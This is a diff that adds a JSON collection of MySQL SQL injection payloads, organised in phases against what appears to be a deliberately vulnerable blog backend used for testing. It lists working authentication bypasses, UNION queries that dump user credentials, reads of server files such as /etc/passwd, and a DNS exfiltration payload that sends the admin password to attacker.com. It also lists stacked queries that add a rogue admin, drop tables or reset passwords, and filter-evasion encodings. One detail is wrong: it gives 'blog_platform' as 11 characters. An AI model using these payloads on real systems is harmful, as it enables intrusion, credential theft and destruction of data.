@@ -1,0 +1,454 @@
+{
+    "metadata": {
+        "description": "SQL Injection Payloads Organized by Phase",
+        "target": "Blog Platform Vulnerable Backend",
+        "database": "MySQL",
+        "created": "2026-05-12"
+    },
+    "phase_1_error_based": {
+        "description": "Use database error messages to gather information",
+        "tests": [
+            {
+                "id": "1.1",
+                "name": "Basic Error Detection",
+                "payload": "admin'",
+                "field": "username",
+                "expected_result": "SQL error message or syntax error",
+                "description": "Tests if input is not properly sanitized"
+            },
+            {
+                "id": "1.2",
+                "name": "AND Condition Test",
+                "payload": "admin' AND 1=1 --",
+                "field": "username",
+                "expected_result": "Login successful",
+                "description": "Confirms vulnerability - first condition true"
+            },
+            {
+                "id": "1.3",
+                "name": "False AND Condition Test",
+                "payload": "admin' AND 1=2 --",
+                "field": "username",
+                "expected_result": "Login fails",
+                "description": "Confirms vulnerability - first condition false"
+            },
+            {
+                "id": "1.4",
+                "name": "Database Version Detection",
+                "payload": "' UNION SELECT @@version, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
+                "field": "username",
+                "expected_result": "MySQL version number displayed",
+                "description": "Extracts MySQL version via error or UNION"
+            },
+            {
+                "id": "1.5",
+                "name": "Database Name Detection",
+                "payload": "' UNION SELECT database(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
+                "field": "username",
+                "expected_result": "blog_platform",
+                "description": "Extracts current database name"
+            },
+            {
+                "id": "1.6",
+                "name": "Current User Detection",
+                "payload": "' UNION SELECT user(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
+                "field": "username",
+                "expected_result": "blog_user@localhost or similar",
+                "description": "Extracts current database user"
+            }
+        ]
+    },
+    "phase_2_auth_bypass": {
+        "description": "Bypass authentication without knowing password",
+        "tests": [
+            {
+                "id": "2.1",
+                "name": "Admin Comment Bypass",
+                "payload": "admin' --",
+                "field": "username",
+                "password": "anything",
+                "expected_result": "Login successful",
+                "description": "Comments out password check, bypasses admin login"
+            },
+            {
+                "id": "2.2",
+                "name": "Always True OR Condition",
+                "payload": "' OR '1'='1' --",
+                "field": "username",
+                "password": "anything",
+                "expected_result": "Login successful",
+                "description": "Always-true condition in WHERE clause"
+            },
+            {
+                "id": "2.3",
+                "name": "Admin Always True",
+                "payload": "admin' OR '1'='1' --",
+                "field": "username",
+                "password": "anything",
+                "expected_result": "Login successful",
+                "description": "Always true with admin username"
+            },
+            {
+                "id": "2.4",
+                "name": "Numeric Always True",
+                "payload": "' OR 1=1 --",
+                "field": "username",
+                "password": "anything",
+                "expected_result": "Login successful",
+                "description": "Numeric always-true condition"
+            },
+            {
+                "id": "2.5",
+                "name": "Block Comment Bypass",
+                "payload": "admin'/*",
+                "field": "username",
+                "password": "anything",
+                "expected_result": "Login successful",
+                "description": "Block comment without closing - comments out password"
+            },
+            {
+                "id": "2.6",
+                "name": "Hash Comment Bypass",
+                "payload": "admin' #",
+                "field": "username",
+                "password": "anything",
+                "expected_result": "Login successful",
+                "description": "MySQL hash comment syntax"
+            }
+        ]
+    },
+    "phase_3_union_based": {
+        "description": "Extract data using UNION SELECT statements",
+        "column_detection": [
+            {
+                "id": "3.1",
+                "name": "Column Count Detection - ORDER BY Method",
+                "payloads": [
+                    "' ORDER BY 1 --",
+                    "' ORDER BY 2 --",
+                    "' ORDER BY 3 --",
+                    "' ORDER BY 4 --",
+                    "' ORDER BY 5 --",
+                    "' ORDER BY 6 --",
+                    "' ORDER BY 7 --",
+                    "' ORDER BY 8 --",
+                    "' ORDER BY 9 --",
+                    "' ORDER BY 10 --"
+                ],
+                "description": "Increment until error - last working number = column count"
+            }
+        ],
+        "data_extraction": [
+            {
+                "id": "3.2",
+                "name": "Verify Column Count with UNION",
+                "payload": "' UNION SELECT 1,2,3,4,5,6,7,8,9 --",
+                "field": "username",
+                "expected_result": "Numbers 1-9 in response",
+                "description": "Confirms correct column count"
+            },
+            {
+                "id": "3.3",
+                "name": "Extract All Users",
+                "payload": "' UNION SELECT id, username, email, password, role, lastLogin, isActive, createdAt, updatedAt FROM Users --",
+                "field": "username",
+                "expected_result": "All user records displayed",
+                "description": "Extracts complete Users table"
+            },
+            {
+                "id": "3.4",
+                "name": "Extract Admin Password",
+                "payload": "' UNION SELECT id, username, email, password, role, NULL, NULL, NULL, NULL FROM Users WHERE role='admin' --",
+                "field": "username",
+                "expected_result": "Admin username and password hash",
+                "description": "Filters to admin user only"
+            },
+            {
+                "id": "3.5",
+                "name": "Extract All Tables",
+                "payload": "' UNION SELECT table_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema = database() --",
+                "field": "username",
+                "expected_result": "Users, Articles, Comments, SequelizeMeta",
+                "description": "Lists all tables in database"
+            },
+            {
+                "id": "3.6",
+                "name": "Extract Column Names from Users",
+                "payload": "' UNION SELECT column_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name = 'Users' --",
+                "field": "username",
+                "expected_result": "All column names from Users table",
+                "description": "Lists all columns in Users table"
+            },
+            {
+                "id": "3.7",
+                "name": "Extract Articles Data",
+                "payload": "' UNION SELECT id, title, content, category, authorId, createdAt, updatedAt, NULL, NULL FROM Articles --",
+                "field": "username",
+                "expected_result": "All articles displayed",
+                "description": "Extracts Articles table"
+            },
+            {
+                "id": "3.8",
+                "name": "Extract Comments Data",
+                "payload": "' UNION SELECT id, content, articleId, authorId, NULL, createdAt, updatedAt, NULL, NULL FROM Comments --",
+                "field": "username",
+                "expected_result": "All comments displayed",
+                "description": "Extracts Comments table"
+            }
+        ]
+    },
+    "phase_4_blind_injection": {
+        "description": "Exploit without visible output using time delays and boolean logic",
+        "time_based": [
+            {
+                "id": "4.1",
+                "name": "Time-Based Detection - IF Function",
+                "payload": "admin' AND IF(1=1, SLEEP(3), 0) --",
+                "field": "username",
+                "password": "anything",
+                "expected_result": "3-second delay in response",
+                "description": "If condition true, response is delayed"
+            },
+            {
+                "id": "4.2",
+                "name": "Time-Based Detection - BENCHMARK",
+                "payload": "admin' AND BENCHMARK(10000000,SHA1('test')) --",
+                "field": "username",
+                "password": "anything",
+                "expected_result": "Response delay from computation",
+                "description": "Alternative time-based detection method"
+            },
+            {
+                "id": "4.3",
+                "name": "Extract Password First Character",
+                "payload": "admin' AND IF(SUBSTRING(password,1,1)='a', SLEEP(3), 0) --",
+                "field": "username",
+                "password": "anything",
+                "expected_result": "3-second delay if first char is 'a'",
+                "description": "Brute force password character by character"
+            }
+        ],
+        "boolean_based": [
+            {
+                "id": "4.4",
+                "name": "Boolean-Based True Condition",
+                "payload": "admin' AND '1'='1' --",
+                "field": "username",
+                "password": "anything",
+                "expected_result": "Login successful (true condition)",
+                "description": "True condition in query"
+            },
+            {
+                "id": "4.5",
+                "name": "Boolean-Based False Condition",
+                "payload": "admin' AND '1'='2' --",
+                "field": "username",
+                "password": "anything",
+                "expected_result": "Login fails (false condition)",
+                "description": "False condition in query"
+            },
+            {
+                "id": "4.6",
+                "name": "Database Length Detection",
+                "payload": "' AND LENGTH(database()) = 11 --",
+                "field": "username",
+                "password": "anything",
+                "expected_result": "True if database name is 11 chars (blog_platform)",
+                "description": "Infer database name length"
+            },
+            {
+                "id": "4.7",
+                "name": "Extract Database Name (Char by Char)",
+                "payload": "' AND ASCII(SUBSTRING(database(),1,1)) = 98 --",
+                "field": "username",
+                "password": "anything",
+                "expected_result": "True if first char is 'b' (ASCII 98)",
+                "description": "Brute force database name"
+            }
+        ]
+    },
+    "phase_5_advanced_extraction": {
+        "description": "Advanced techniques for mass data extraction",
+        "tests": [
+            {
+                "id": "5.1",
+                "name": "Concatenate Multiple Columns",
+                "payload": "' UNION SELECT CONCAT(username, ':', email, ':', password), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM Users --",
+                "field": "username",
+                "expected_result": "username:email:password format for all users",
+                "description": "Combines multiple columns into single output"
+            },
+            {
+                "id": "5.2",
+                "name": "GROUP_CONCAT All Users",
+                "payload": "' UNION SELECT GROUP_CONCAT(CONCAT(username, '|', email, '|', password, '|', role) SEPARATOR '; '), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM Users --",
+                "field": "username",
+                "expected_result": "All users in one row separated by semicolons",
+                "description": "Dumps entire Users table in one payload"
+            },
+            {
+                "id": "5.3",
+                "name": "Extract User Privileges",
+                "payload": "' UNION SELECT grantee, privilege_type, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.user_privileges --",
+                "field": "username",
+                "expected_result": "Database user permissions",
+                "description": "Lists database user privileges"
+            },
+            {
+                "id": "5.4",
+                "name": "Read Server Files (Linux)",
+                "payload": "' UNION SELECT LOAD_FILE('/etc/passwd'), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
+                "field": "username",
+                "expected_result": "Contents of /etc/passwd file",
+                "description": "Reads system files (if permissions allow)"
+            },
+            {
+                "id": "5.5",
+                "name": "Read Server Files (Windows)",
+                "payload": "' UNION SELECT LOAD_FILE('C:\\\\windows\\\\win.ini'), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
+                "field": "username",
+                "expected_result": "Contents of windows config files",
+                "description": "Reads Windows system files (if permissions allow)"
+            }
+        ]
+    },
+    "phase_6_out_of_band": {
+        "description": "Data exfiltration via DNS or HTTP callbacks",
+        "dns_based": [
+            {
+                "id": "6.1",
+                "name": "DNS Exfiltration - Password Extract",
+                "payload": "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM Users WHERE username='admin'), '.attacker.com\\\\test')) --",
+                "field": "username",
+                "expected_result": "DNS query to attacker.com with password as subdomain",
+                "description": "Exfiltrates data via DNS lookup"
+            }
+        ],
+        "http_based": [
+            {
+                "id": "6.2",
+                "name": "HTTP Callback via INTO OUTFILE",
+                "payload": "' UNION SELECT id, username, password INTO OUTFILE '/var/www/html/exfil.txt' FROM Users --",
+                "field": "username",
+                "expected_result": "User data written to web-accessible file",
+                "description": "Writes data to file for retrieval"
+            }
+        ]
+    },
+    "phase_7_second_order": {
+        "description": "Stored injection for persistent attacks",
+        "tests": [
+            {
+                "id": "7.1",
+                "name": "Register with Malicious Username",
+                "payload": "test' OR '1'='1",
+                "field": "username",
+                "endpoint": "register",
+                "description": "Register user with SQL injection in username"
+            },
+            {
+                "id": "7.2",
+                "name": "Trigger Stored Payload on Login",
+                "description": "After registering, attempt to login with the malicious username to trigger the stored payload"
+            }
+        ]
+    },
+    "phase_8_stacked_queries": {
+        "description": "Execute multiple SQL statements",
+        "tests": [
+            {
+                "id": "8.1",
+                "name": "Create New Admin User",
+                "payload": "admin'; INSERT INTO Users (username, email, password, role, createdAt, updatedAt) VALUES ('hacker', 'hacker@evil.com', 'hacked123', 'admin', NOW(), NOW()); --",
+                "field": "username",
+                "expected_result": "New admin user 'hacker' created in database",
+                "description": "Adds new administrative user"
+            },
+            {
+                "id": "8.2",
+                "name": "Delete All Articles",
+                "payload": "admin'; DELETE FROM Articles; --",
+                "field": "username",
+                "expected_result": "All articles deleted",
+                "description": "Deletes all articles (DESTRUCTIVE)"
+            },
+            {
+                "id": "8.3",
+                "name": "Drop Users Table",
+                "payload": "admin'; DROP TABLE Users; --",
+                "field": "username",
+                "expected_result": "Users table deleted",
+                "description": "Destroys Users table (HIGHLY DESTRUCTIVE)"
+            },
+            {
+                "id": "8.4",
+                "name": "Update All Passwords",
+                "payload": "admin'; UPDATE Users SET password='hacked' WHERE role='admin'; --",
+                "field": "username",
+                "expected_result": "All admin passwords changed",
+                "description": "Modifies all admin passwords"
+            }
+        ]
+    },
+    "phase_9_waf_bypass": {
+        "description": "Bypass security filters and WAF rules",
+        "tests": [
+            {
+                "id": "9.1",
+                "name": "URL Encoding - Single Level",
+                "payload": "%27%20OR%20%271%27%3D%271",
+                "field": "username",
+                "description": "URL encoded payload"
+            },
+            {
+                "id": "9.2",
+                "name": "URL Encoding - Double Level",
+                "payload": "%2527%2520OR%2520%25271%2527%253D%25271",
+                "field": "username",
+                "description": "Double URL encoded payload"
+            },
+            {
+                "id": "9.3",
+                "name": "Case Variation",
+                "payload": "AdMiN' --",
+                "field": "username",
+                "description": "Mixed case bypasses simple filters"
+            },
+            {
+                "id": "9.4",
+                "name": "Multiple Comment Styles",
+                "payload": "admin'/**/--",
+                "field": "username",
+                "description": "Comments with space"
+            },
+            {
+                "id": "9.5",
+                "name": "MySQL Version Comment",
+                "payload": "admin'/*!12345*/--",
+                "field": "username",
+                "description": "MySQL version-specific comment"
+            },
+            {
+                "id": "9.6",
+                "name": "Space Replacement with Tab",
+                "payload": "admin'\t--",
+                "field": "username",
+                "description": "Tab instead of space"
+            },
+            {
+                "id": "9.7",
+                "name": "Line Feed Character",
+                "payload": "admin'\n--",
+                "field": "username",
+                "description": "Newline character for bypass"
+            },
+            {
+                "id": "9.8",
+                "name": "Alternative OR Syntax",
+                "payload": "' /*!50000or*/ '1'='1",
+                "field": "username",
+                "description": "MySQL version-specific OR statement"
+            }
+        ]
+    }
+}
